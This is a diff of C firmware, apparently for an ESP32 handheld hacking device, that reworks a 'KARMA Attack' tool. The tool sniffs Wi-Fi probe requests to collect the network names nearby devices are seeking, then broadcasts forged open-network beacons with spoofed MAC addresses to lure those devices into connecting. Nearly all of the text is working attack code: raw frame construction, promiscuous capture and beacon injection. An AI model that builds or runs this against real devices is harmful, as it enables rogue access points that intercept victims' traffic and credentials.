@@ -706,17 +706,29 @@ static void dhRunProbeSniffer() {
 // ═══════════════════════════════════════════════════════════
 // TOOL: KARMA Attack — responds to probes with matching SSIDs
 // ═══════════════════════════════════════════════════════════
+// Architecture: 2-phase (matching original Karma.cpp)
+//   Phase 1: Promiscuous scan collects probe SSIDs (NO TX in callback)
+//   Phase 2: Main loop sends beacons; callback only counts probes
 
-static volatile unsigned long dhKarmaCount = 0;
-static volatile int dhKarmaSSIDs = 0;
+#define DH_KARMA_MAX_SSIDS   30
+#define DH_KARMA_SCAN_SECS   12
+#define DH_KARMA_BEACON_MS   25     // beacon interval per SSID
+
+static char     dhKarmaScanSSIDs[DH_KARMA_MAX_SSIDS][33];
+static volatile int dhKarmaScanCount = 0;
+static volatile uint32_t dhKarmaScanProbes = 0;
+
+static volatile uint32_t dhKarmaBeaconsSent = 0;
+static volatile uint32_t dhKarmaProbesDuringAtk = 0;
 static uint8_t dhKarmaMac[6];
 
-static void dhKarmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+// Phase 1 callback: ONLY collects SSIDs — NO TX
+static void dhKarmaScanCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   if (type != WIFI_PKT_MGMT) return;
   wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
   uint8_t* p = pkt->payload;
   int len = pkt->rx_ctrl.sig_len;
-  if (len < 28 || p[0] != 0x40) return;
+  if (len < 28 || p[0] != 0x40) return; // not a probe request
 
   uint8_t tagLen = p[25];
   if (p[24] != 0x00 || tagLen == 0 || tagLen > 32) return;
@@ -726,38 +738,77 @@ static void dhKarmaProbeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
   memcpy(ssid, &p[26], tagLen);
   ssid[tagLen] = '\0';
 
-  // Send a beacon with matching SSID
-  uint8_t beacon[200] = {
-    0x80, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x64, 0x00, 0x01, 0x04, 0x00, 0x00
-  };
-  static const uint8_t tail[] = {
-    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
-    0x03, 0x01, 0x00
-  };
-
-  for (int i = 0; i < 6; i++) {
-    beacon[10 + i] = dhKarmaMac[i];
-    beacon[16 + i] = dhKarmaMac[i];
+  // Validate printable ASCII
+  for (int i = 0; i < tagLen; i++) {
+    if ((uint8_t)ssid[i] < 32 || (uint8_t)ssid[i] > 126) return;
   }
-  beacon[37] = (uint8_t)tagLen;
-  memcpy(&beacon[38], ssid, tagLen);
-  int tailOff = 38 + tagLen;
-  memcpy(&beacon[tailOff], tail, sizeof(tail));
-  beacon[tailOff + sizeof(tail) - 1] = pkt->rx_ctrl.channel;
 
-  esp_wifi_80211_tx(WIFI_IF_AP, beacon, tailOff + sizeof(tail), false);
-  dhKarmaCount++;
-  dhKarmaSSIDs++;
+  dhKarmaScanProbes++;
+
+  // Deduplicate
+  for (int i = 0; i < dhKarmaScanCount; i++) {
+    if (strcmp(dhKarmaScanSSIDs[i], ssid) == 0) return;
+  }
+  if (dhKarmaScanCount < DH_KARMA_MAX_SSIDS) {
+    strncpy(dhKarmaScanSSIDs[dhKarmaScanCount], ssid, 32);
+    dhKarmaScanSSIDs[dhKarmaScanCount][32] = '\0';
+    dhKarmaScanCount++;
+  }
+}
+
+// Phase 2 callback: ONLY counts probes — NO TX
+static void dhKarmaAtkCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (type != WIFI_PKT_MGMT) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  if (pkt->rx_ctrl.sig_len < 28) return;
+  if (pkt->payload[0] != 0x40) return;
+  dhKarmaProbesDuringAtk++;
+}
+
+// Send a single beacon with the given SSID (called from main loop, NOT from callback)
+static void dhKarmaSendBeacon(const char* ssid, int channel) {
+  int ssidLen = strlen(ssid);
+  if (ssidLen > 32) ssidLen = 32;
+
+  // Deterministic MAC per SSID (stable for client association)
+  uint32_t hash = 0;
+  for (int i = 0; i < ssidLen; i++) hash = hash * 31 + ssid[i];
+
+  uint8_t beacon[128] = {
+    0x80, 0x00, 0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination: broadcast
+    0x02, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source MAC (filled below)
+    0x02, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (filled below)
+    0x00, 0x00,                           // Sequence
+    0x83, 0x51, 0xF7, 0x8F, 0x0F, 0x00, 0x00, 0x00,  // Timestamp
+    0x64, 0x00,                           // Beacon interval
+    0x21, 0x04,                           // Capabilities (ESS, no privacy)
+    0x00, 0x00                            // SSID tag (id=0, len=placeholder)
+  };
+  static const uint8_t trailer[] = {
+    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,  // Supported rates
+    0x03, 0x01, 0x00  // DS param (channel filled at end)
+  };
+
+  beacon[10] = 0x02;
+  beacon[11] = (hash >> 16) & 0xFF;
+  beacon[12] = (hash >> 8)  & 0xFF;
+  beacon[13] = hash & 0xFF;
+  beacon[14] = 0xBE; beacon[15] = 0xEF;
+  memcpy(&beacon[16], &beacon[10], 6); // BSSID = source
+
+  beacon[37] = (uint8_t)ssidLen;
+  memcpy(&beacon[38], ssid, ssidLen);
+  int tailOff = 38 + ssidLen;
+  memcpy(&beacon[tailOff], trailer, sizeof(trailer));
+  beacon[tailOff + sizeof(trailer) - 1] = (uint8_t)channel;
+
+  esp_wifi_80211_tx(WIFI_IF_AP, beacon, tailOff + sizeof(trailer), false);
+  dhKarmaBeaconsSent++;
 }
 
 static void dhRunKarma() {
-  // Disclaimer
+  // ── Disclaimer ──
   tft.fillScreen(CLR_BG);
   tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
   tft.setTextColor(CLR_SECONDARY);
@@ -777,63 +828,203 @@ static void dhRunKarma() {
     delay(20);
   }
 
-  dhKarmaCount = 0; dhKarmaSSIDs = 0;
-  for (int i = 0; i < 6; i++) dhKarmaMac[i] = (uint8_t)random(0, 256);
-  dhKarmaMac[0] &= 0xFE;
+  // ══════════════════════════════════════════════════════════
+  //  PHASE 1: Probe Capture Scan
+  // ══════════════════════════════════════════════════════════
+  dhKarmaScanCount = 0;
+  dhKarmaScanProbes = 0;
 
   dhNetPaused = true;
   WiFi.mode(WIFI_AP);
-  WiFi.softAP("dh_karma_temp", "12345678"); // Dummy AP to bring up interface
+  WiFi.softAP("dh_karma_temp", "12345678");
   delay(100);
   esp_wifi_set_promiscuous(true);
-  esp_wifi_set_promiscuous_rx_cb(&dhKarmaProbeCallback);
+  esp_wifi_set_promiscuous_rx_cb(&dhKarmaScanCallback);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
+
+  tft.fillScreen(CLR_BG);
+  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_PRIMARY);
+  tft.setTextColor(CLR_PRIMARY);
+  tft.drawCentreString("KARMA [1/2]", SCR_CX, SCALE_Y(4), 1);
+  tft.setTextColor(CLR_TEXT_MED);
+  tft.drawCentreString("Scanning probes...", SCR_CX, SCALE_Y(18), 1);
+
+  // Progress bar frame
+  int barX = SCALE_X(8), barY = SCALE_Y(32), barW = SCR_W - SCALE_X(16), barH = SCALE_Y(8);
+  tft.drawRect(barX, barY, barW, barH, CLR_PRIMARY);
 
   static const int hopChs[] = {1, 6, 11};
   int hopIdx = 0;
-  unsigned long lastDraw = 0, lastHop = 0;
-  unsigned long holdStart = 0; bool holding = false;
+  unsigned long scanStart = millis();
+  unsigned long lastHop = scanStart;
+  int lastDrawnCount = -1;
 
-  tft.fillScreen(CLR_BG);
-  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SECONDARY);
-  tft.setTextColor(CLR_SECONDARY);
-  tft.drawCentreString("KARMA ACTIVE", SCR_CX, SCALE_Y(4), 1);
-
-  while (true) {
-    extern void handleNetwork(); handleNetwork();
+  while (millis() - scanStart < (unsigned long)DH_KARMA_SCAN_SECS * 1000) {
+    // Channel hop
     if (millis() - lastHop > 1500) {
       hopIdx = (hopIdx + 1) % 3;
       esp_wifi_set_channel(hopChs[hopIdx], WIFI_SECOND_CHAN_NONE);
       lastHop = millis();
     }
 
-    if (millis() - lastDraw > 400) {
-      tft.fillRect(SCALE_X(4), SCALE_Y(20), SCR_W - SCALE_X(8), SCALE_Y(70), CLR_BG);
-      char buf[32];
-      sprintf(buf, "Beacons: %lu", dhKarmaCount);
-      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(4), SCALE_Y(25), 1);
-      sprintf(buf, "SSIDs: %d", dhKarmaSSIDs);
-      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(4), SCALE_Y(40), 1);
-      sprintf(buf, "CH: %d", hopChs[hopIdx]);
-      tft.setTextColor(CLR_WARNING); tft.drawString(buf, SCALE_X(4), SCALE_Y(55), 1);
+    // Progress bar fill
+    float p = (float)(millis() - scanStart) / (DH_KARMA_SCAN_SECS * 1000.0f);
+    int fw = (int)((barW - 2) * p);
+    tft.fillRect(barX + 1, barY + 1, fw, barH - 2, CLR_SUCCESS);
 
-      int barW = random(20, SCR_W - SCALE_X(8));
-      tft.fillRect(SCALE_X(4), SCALE_Y(75), SCR_W - SCALE_X(8), SCALE_Y(4), CLR_SURFACE);
-      tft.fillRect(SCALE_X(4), SCALE_Y(75), barW, SCALE_Y(4), CLR_SECONDARY);
+    // Update counter display
+    if (dhKarmaScanCount != lastDrawnCount) {
+      tft.fillRect(SCALE_X(4), SCALE_Y(46), SCR_W - SCALE_X(8), SCALE_Y(40), CLR_BG);
+      char buf[32];
+      sprintf(buf, "SSIDs: %d", (int)dhKarmaScanCount);
+      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(6), SCALE_Y(48), 1);
+      sprintf(buf, "Probes: %lu", (unsigned long)dhKarmaScanProbes);
+      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(6), SCALE_Y(60), 1);
+
+      // Show latest SSID
+      if (dhKarmaScanCount > 0) {
+        tft.setTextColor(CLR_TEXT_MED);
+        String s = String(dhKarmaScanSSIDs[dhKarmaScanCount - 1]);
+        if (s.length() > 20) s = s.substring(0, 20) + "..";
+        tft.drawString(s, SCALE_X(6), SCALE_Y(74), 1);
+      }
+      lastDrawnCount = dhKarmaScanCount;
+    }
+
+    yield(); delay(40);
+  }
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(NULL);
+
+  if (dhKarmaScanCount == 0) {
+    // No probes captured
+    tft.fillScreen(CLR_BG);
+    tft.drawRect(0, 0, SCR_W, SCR_H, CLR_DANGER);
+    tft.setTextColor(CLR_DANGER);
+    tft.drawCentreString("NO PROBES", SCR_CX, SCALE_Y(30), 1);
+    tft.setTextColor(CLR_TEXT_MED);
+    tft.drawCentreString("No SSIDs captured.", SCR_CX, SCALE_Y(50), 1);
+    tft.drawCentreString("Try again with", SCR_CX, SCALE_Y(65), 1);
+    tft.drawCentreString("devices nearby.", SCR_CX, SCALE_Y(78), 1);
+    tft.setTextColor(CLR_TEXT_LO);
+    tft.drawCentreString("SEL: Back", SCR_CX, SCR_H - SCALE_Y(12), 1);
+    while (true) {
+      if ((digitalRead(BTN_SELECT) == BTN_ACTIVE_LEVEL || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
+      delay(20);
+    }
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_STA);
+    dhNetPaused = false;
+    delay(100);
+    return;
+  }
+
+  // ── Confirmation screen ──
+  tft.fillScreen(CLR_BG);
+  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_SUCCESS);
+  tft.setTextColor(CLR_SUCCESS);
+  tft.drawCentreString("READY", SCR_CX, SCALE_Y(6), 1);
+  char buf[32];
+  sprintf(buf, "SSIDs: %d", (int)dhKarmaScanCount);
+  tft.setTextColor(CLR_PRIMARY); tft.drawCentreString(buf, SCR_CX, SCALE_Y(22), 1);
+  // Show first few SSIDs
+  int showN = min((int)dhKarmaScanCount, 4);
+  for (int i = 0; i < showN; i++) {
+    tft.setTextColor(CLR_TEXT_MED);
+    String s = String(dhKarmaScanSSIDs[i]);
+    if (s.length() > 22) s = s.substring(0, 22);
+    tft.drawString(s, SCALE_X(6), SCALE_Y(38) + i * SCALE_Y(12), 1);
+  }
+  tft.setTextColor(CLR_TEXT_LO);
+  tft.drawCentreString("SEL:Attack <:Cancel", SCR_CX, SCR_H - SCALE_Y(12), 1);
+
+  while (true) {
+    if ((digitalRead(BTN_SELECT) == BTN_ACTIVE_LEVEL || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) { delay(200); break; }
+    if ((digitalRead(BTN_LEFT) == BTN_ACTIVE_LEVEL || (virtualLeftPressed ? (virtualLeftPressed=false, true) : false))) {
+      delay(200);
+      WiFi.softAPdisconnect(true);
+      WiFi.mode(WIFI_STA);
+      dhNetPaused = false;
+      delay(100);
+      return;
+    }
+    delay(20);
+  }
+
+  // ══════════════════════════════════════════════════════════
+  //  PHASE 2: Beacon TX Attack (TX in main loop, NOT callback)
+  // ══════════════════════════════════════════════════════════
+  dhKarmaBeaconsSent = 0;
+  dhKarmaProbesDuringAtk = 0;
+  int karmaIdx = 0;
+  hopIdx = 0;
+
+  // Switch to counter-only callback for attack phase
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(&dhKarmaAtkCallback);
+  esp_wifi_set_channel(hopChs[0], WIFI_SECOND_CHAN_NONE);
+
+  unsigned long lastDraw = 0, lastHop2 = 0;
+  unsigned long holdStart = 0; bool holding = false;
+
+  tft.fillScreen(CLR_BG);
+  tft.drawRect(0, 0, SCR_W, SCR_H, CLR_DANGER);
+  tft.setTextColor(CLR_DANGER);
+  tft.drawCentreString("KARMA [2/2]", SCR_CX, SCALE_Y(4), 1);
+
+  while (true) {
+    // Channel hop
+    if (millis() - lastHop2 > 600) {
+      hopIdx = (hopIdx + 1) % 3;
+      esp_wifi_set_channel(hopChs[hopIdx], WIFI_SECOND_CHAN_NONE);
+      lastHop2 = millis();
+    }
+
+    // Send beacon bursts (3 per cycle, rotating SSIDs)
+    if (dhKarmaScanCount > 0) {
+      for (int burst = 0; burst < 3; burst++) {
+        dhKarmaSendBeacon(dhKarmaScanSSIDs[karmaIdx], hopChs[hopIdx]);
+        karmaIdx = (karmaIdx + 1) % dhKarmaScanCount;
+      }
+    }
+
+    // UI refresh
+    if (millis() - lastDraw > 400) {
+      tft.fillRect(SCALE_X(4), SCALE_Y(18), SCR_W - SCALE_X(8), SCALE_Y(70), CLR_BG);
+      char buf[32];
+      sprintf(buf, "Beacons: %lu", (unsigned long)dhKarmaBeaconsSent);
+      tft.setTextColor(CLR_SUCCESS); tft.drawString(buf, SCALE_X(4), SCALE_Y(20), 1);
+      sprintf(buf, "SSIDs: %d", (int)dhKarmaScanCount);
+      tft.setTextColor(CLR_PRIMARY); tft.drawString(buf, SCALE_X(4), SCALE_Y(34), 1);
+      sprintf(buf, "Probes: %lu", (unsigned long)dhKarmaProbesDuringAtk);
+      tft.setTextColor(CLR_WARNING); tft.drawString(buf, SCALE_X(4), SCALE_Y(48), 1);
+      sprintf(buf, "CH: %d", hopChs[hopIdx]);
+      tft.setTextColor(CLR_TEXT_MED); tft.drawString(buf, SCALE_X(4), SCALE_Y(62), 1);
+
+      // Show current SSID being broadcast
+      if (dhKarmaScanCount > 0) {
+        tft.setTextColor(CLR_TEXT_LO);
+        String s = String(dhKarmaScanSSIDs[karmaIdx]);
+        if (s.length() > 22) s = s.substring(0, 22);
+        tft.drawString(s, SCALE_X(4), SCALE_Y(76), 1);
+      }
 
       tft.setTextColor(CLR_TEXT_LO);
       tft.drawString("HOLD SEL: stop", SCALE_X(4), SCR_H - SCALE_Y(12), 1);
       lastDraw = millis();
     }
 
+    // Hold SELECT to stop
     if ((digitalRead(BTN_SELECT) == BTN_ACTIVE_LEVEL || (virtualSelectPressed ? (virtualSelectPressed=false, true) : false))) {
       if (!holding) { holdStart = millis(); holding = true; }
       if (millis() - holdStart > 800) break;
     } else { holding = false; }
 
-    yield(); delay(5);
+    yield(); delay(DH_KARMA_BEACON_MS);
   }
 
+  // Cleanup
   esp_wifi_set_promiscuous(false);
   esp_wifi_set_promiscuous_rx_cb(NULL);
   WiFi.softAPdisconnect(true);
@@ -841,6 +1032,7 @@ static void dhRunKarma() {
   dhNetPaused = false;
   delay(100);
 }
+
 
 // ═══════════════════════════════════════════════════════════
 // TOOL: WiFi Config — connect to AP using button-based entry
